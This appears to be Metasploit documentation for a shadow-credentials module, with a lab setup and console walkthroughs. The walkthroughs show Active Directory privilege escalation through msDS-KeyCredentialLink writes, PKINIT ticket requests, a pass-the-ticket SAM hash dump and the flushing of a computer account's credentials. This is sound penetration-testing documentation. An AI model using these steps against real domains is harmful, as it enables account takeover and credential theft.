## Shadow Credentials Exploitation

If an account has the ability to write to the `msDS-KeyCredentialLink` attribute against a target, this can be abused for privilege escalation.
This situation exists when a user contains the `GenericWrite` permission over another account. In addition, by default, Computer accounts have 
the ability to write their own value (whereas user accounts do not).

The `auxiliary/admin/ldap/shadow_credentials` module can be used to read and write the `msDS-KeyCredentialLink` LDAP attribute against a target.
When writing, the module will append a KeyCredential blob to this LDAP attribute, and write a certificate file (`pfx`) to disk. This `pfx` file
can then be used to authenticate as the account using PKINIT (the `auxiliary/admin/kerberos/get_ticket` module), as long as Certificate Services
are enabled within the domain.

## Lab setup

Set up a domain with AD CS configured.

For the Shadow Credentials attack to work, an Active Directory account (e.g. `sandy`) is required with write privileges to the target account (i.e. `victim`).
Alternatively, Computer accounts should be able to modify this value for their own account, with some limitations (described below).

From an admin powershell prompt, first create a new Active Directory account, `sandy`, in your Active Directory environment:

```powershell
# Create a basic user account
net user /add sandy Password1!

# Mark the sandy and password as never expiring, to ensure the lab setup still works in the future
net user sandy /expires:never
Set-AdUser -Identity sandy -PasswordNeverExpires:$true
```

Grant Write privileges for sandy to the target account, i.e. `victim`:

```powershell
# Remember to change victim to the name of your target user
$TargetUser = Get-ADUser 'victim'
$User = Get-ADUser 'sandy'

# Add GenericWrite access to the user against the target computer
$Rights = [System.DirectoryServices.ActiveDirectoryRights] "GenericWrite"
$ControlType = [System.Security.AccessControl.AccessControlType] "Allow"
$InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] "All"
$GenericWriteAce = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $User.Sid,$Rights,$ControlType,$InheritanceType
$TargetUserAcl = Get-Acl "AD:$($TargetUser.DistinguishedName)"
$TargetUserAcl.AddAccessRule($GenericWriteAce)
Set-Acl -AclObject $TargetUserAcl -Path "AD:$($TargetUser.DistinguishedName)"
```

Finally Verify the Write privileges for the sandy account:

```powershell
PS C:\Users\administrator> $TargetUser = Get-ADUser 'victim'
PS C:\Users\administrator> (Get-ACL "AD:$($TargetUser.DistinguishedName)").Access| Where-Object { $_.IdentityReference -Match 'sandy' }

ActiveDirectoryRights : GenericWrite
InheritanceType       : All
ObjectType            : 00000000-0000-0000-0000-000000000000
InheritedObjectType   : 00000000-0000-0000-0000-000000000000
ObjectFlags           : None
AccessControlType     : Allow
IdentityReference     : MSFLAB\sandy
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
```

## Module usage
1. `use auxiliary/admin/ldap/shadow_credentials`
2. Set the `RHOST` value to a target domain controller
3. Set the `LDAPUsername` and `LDAPPassword` information to an account with the necessary privileges
4. Set the `TARGET_USER` to the victim account
5. Use the `ADD` action to add a credential entry to the victim account

See the Scenarios for a more detailed walk through

## Actions

### FLUSH
Delete *all* credential entries. Unlike the REMOVE action, this deletes the entire property instead of just
the matching device IDs. Use with caution, as any existing entries may be relied upon by legitimate users.

### LIST
Read the credential entries and print the Device (Certificate) IDs of currently configured entries

### REMOVE
Remove matching certificates from the `msDS-KeyCredentialLink` property. Unlike the FLUSH action, this only removes the matching Device (Certificate) ID
instead of deleting the entire property.

### ADD
Add a certificate entry to the `msDS-KeyCredentialLink` property. The new entry will be appended to the end of the existing set of values.

## Options

### TARGET_USER
The user (or computer) account being targeted. This is the object whose Key Credential property is the target of the ACTION
(read, write, etc.). The authenticated user must have the appropriate access to this object.

### DEVICE_ID
The certificate ID to delete when using the `REMOVE` action. You can retrieve Certificate IDs for a user account by using the `LIST` action.

## Scenarios

### Window Server 2022 Domain Controller, Targeting user account

In the following example the user `MSF\sandy` has write access to the user account `victim`. We will start the attack using the `admin/ldap/shadow_credentials` module.

```msf
msf6 auxiliary(admin/ldap/shadow_credentials) > show options

Module options (auxiliary/admin/ldap/shadow_credentials):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   SSL          false            no        Enable SSL on the LDAP connection
   TARGET_USER                   yes       The target to write to


   When ACTION is REMOVE:

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   DEVICE_ID                   no        The specific certificate ID to operate on


   Used when connecting via an existing SESSION:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on


   Used when making a new connection via RHOSTS:

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   LDAPDomain                     no        The domain to authenticate to
   LDAPPassword                   no        The password to authenticate with
   LDAPUsername                   no        The username to authenticate with
   RHOSTS                         no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT         389              no        The target port


Auxiliary action:

   Name  Description
   ----  -----------
   LIST  Read all credentials associated with the account



View the full module info with the info, or info -d command.

msf6 auxiliary(admin/ldap/shadow_credentials) > set rhosts 20.92.148.129
rhosts => 20.92.148.129
msf6 auxiliary(admin/ldap/shadow_credentials) > set ldapdomain MSF.LOCAL
ldapdomain => MSF.LOCAL
msf6 auxiliary(admin/ldap/shadow_credentials) > set ldapusername sandy
ldapusername => sandy
msf6 auxiliary(admin/ldap/shadow_credentials) > set ldappassword Password1!
ldappassword => Password1!
msf6 auxiliary(admin/ldap/shadow_credentials) > set target_user victim
target_user => victim
msf6 auxiliary(admin/ldap/shadow_credentials) > set action add
action => add
msf6 auxiliary(admin/ldap/shadow_credentials) > run
[*] Running module against 20.92.148.129

[*] Discovering base DN automatically
[+] 20.92.148.129:389 Discovered base DN: DC=msf,DC=local
[*] Certificate stored at: /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.ad.cs_300384.pfx
[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 8a75b35e-f4d9-4469-49aa-3f0bfc692f07
[*] Auxiliary module execution completed
```

The LDAP property has been successfully updated. Now we can request a TGT using the `get_ticket` module.


```msf
msf6 auxiliary(admin/kerberos/get_ticket) > set rhosts 20.92.148.129
rhosts => 20.92.148.129
msf6 auxiliary(admin/kerberos/get_ticket) > set username victim
username => victim
msf6 auxiliary(admin/kerberos/get_ticket) > set domain MSF.LOCAL
domain => MSF.LOCAL
msf6 auxiliary(admin/kerberos/get_ticket) > set cert_file /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.ad.cs_300384.pfx
cert_file => /home/user/.msf4/loot/20240404115740_default_20.92.148.129_windows.ad.cs_300384.pfx
msf6 auxiliary(admin/kerberos/get_ticket) > run
[*] Running module against 20.92.148.129

[!] Warning: Provided principal and realm (victim@MSF.LOCAL) do not match entries in certificate:
[*] 20.92.148.129:88 - Getting TGT for victim@MSF.LOCAL
[+] 20.92.148.129:88 - Received a valid TGT-Response
[*] 20.92.148.129:88 - TGT MIT Credential Cache ticket saved to /home/user/.msf4/loot/20240404120020_default_20.92.148.129_mit.kerberos.cca_046023.bin
[*] Auxiliary module execution completed
```

The saved TGT can be used in a pass-the-ticket style attack. For instance using the `auxiliary/gather/windows_secrets_dump` module:

```msf
msf6 auxiliary(gather/windows_secrets_dump) > run smb::auth=kerberos smb::rhostname=dc22 smbuser=victim smbdomain=msf.local rhost=20.92.148.129 domaincontrollerrhost=20.92.148.129
[*] Running module against 20.92.148.129

[*] 20.92.148.129:445 - Using cached credential for krbtgt/MSF.LOCAL@MSF.LOCAL victim@MSF.LOCAL
[+] 20.92.148.129:445 - 20.92.148.129:88 - Received a valid TGS-Response
[*] 20.92.148.129:445 - 20.92.148.129:445 - TGS MIT Credential Cache ticket saved to /home/user/.msf4/loot/20240404121510_default_20.92.148.129_mit.kerberos.cca_449355.bin
[+] 20.92.148.129:445 - 20.92.148.129:88 - Received a valid delegation TGS-Response
[*] 20.92.148.129:445 - Service RemoteRegistry is already running
[*] 20.92.148.129:445 - Retrieving target system bootKey
[+] 20.92.148.129:445 - bootKey: 0x019e09099ae1ec55560bc1e7f9414919
[*] 20.92.148.129:445 - Saving remote SAM database
[*] 20.92.148.129:445 - Dumping SAM hashes
[*] 20.92.148.129:445 - Password hints:
No users with password hints on this system
[*] 20.92.148.129:445 - Password hashes (pwdump format - uid:rid:lmhash:nthash:::):
Administrator:500:aad3b435b51404eeaad3b435b51404ee:26f8220ed7f1494c5737bd552e661f89:::
```

### Window Server 2022 Domain Controller, Computer account targeting itself

In the following example the user `MSF\DESKTOP-H4VEQQHQ$` targets itself. No special permissions are required for this, as computers have some ability to modify their own value by default.

```msf
msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ password=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV action=add
[*] Running module against 20.92.148.129

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[*] 20.92.148.129:389 Getting root DSE
[+] 20.92.148.129:389 Discovered base DN: DC=msf,DC=local
[*] Certificate stored at: /home/user/.msf4/loot/20240404122017_default_20.92.148.129_windows.ad.cs_502988.pfx
[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID ff946afc-a94a-f9c5-7229-861bb9ee4709
[*] Auxiliary module execution completed
```

Note, however, that attempting to add a second credential will fail under these circumstances:

```msf
msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV action=add
[*] Running module against 20.92.148.129

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[*] 20.92.148.129:389 Getting root DSE
[+] 20.92.148.129:389 Discovered base DN: DC=msf,DC=local
[!] By default, computer accounts can only update their key credentials if no value already exists. If there is already a value present, you can remove it, and add your own, but any users relying on the existing credentials will not be able to authenticate until you replace the existing value(s).
[-] Failed to update the msDS-KeyCredentialLink attribute.
[-] Auxiliary aborted due to failure: no-access: The LDAP operation failed due to insufficient access rights.
[*] Auxiliary module execution completed
```

This is because computer accounts only have permission to modify their own `msDS-KeyCredentialLink` property if it does not already have a value.
It is possible to circumvent this by first entirely removing the existing value, and then adding a new one. Note that this will break authentication
for any legitimate user relying on the existing value.

```msf
msf6 auxiliary(admin/ldap/shadow_credentials) > set action flush
action => flush
msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV
[*] Running module against 20.92.148.129

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[*] 20.92.148.129:389 Getting root DSE
[+] 20.92.148.129:389 Discovered base DN: DC=msf,DC=local
[+] Successfully deleted the msDS-KeyCredentialLink attribute.
[*] Auxiliary module execution completed
msf6 auxiliary(admin/ldap/shadow_credentials) > set action add
action => add
msf6 auxiliary(admin/ldap/shadow_credentials) > run rhost=20.92.148.129 ldapusername=DESKTOP-H971T3AH$ target_user=DESKTOP-H971T3AH$ ldappassword=JJ2xSxvop2KERcJu8JMEmzv5sswNZBlV
[*] Running module against 20.92.148.129

[+] Successfully bound to the LDAP server!
[*] Discovering base DN automatically
[*] 20.92.148.129:389 Getting root DSE
[+] 20.92.148.129:389 Discovered base DN: DC=msf,DC=local
[*] Certificate stored at: /home/user/.msf4/loot/20240404122240_default_20.92.148.129_windows.ad.cs_785877.pfx
[+] Successfully updated the msDS-KeyCredentialLink attribute; certificate with device ID 1107833b-0eb6-0477-a7c6-3590b326851a
[*] Auxiliary module execution completed
```
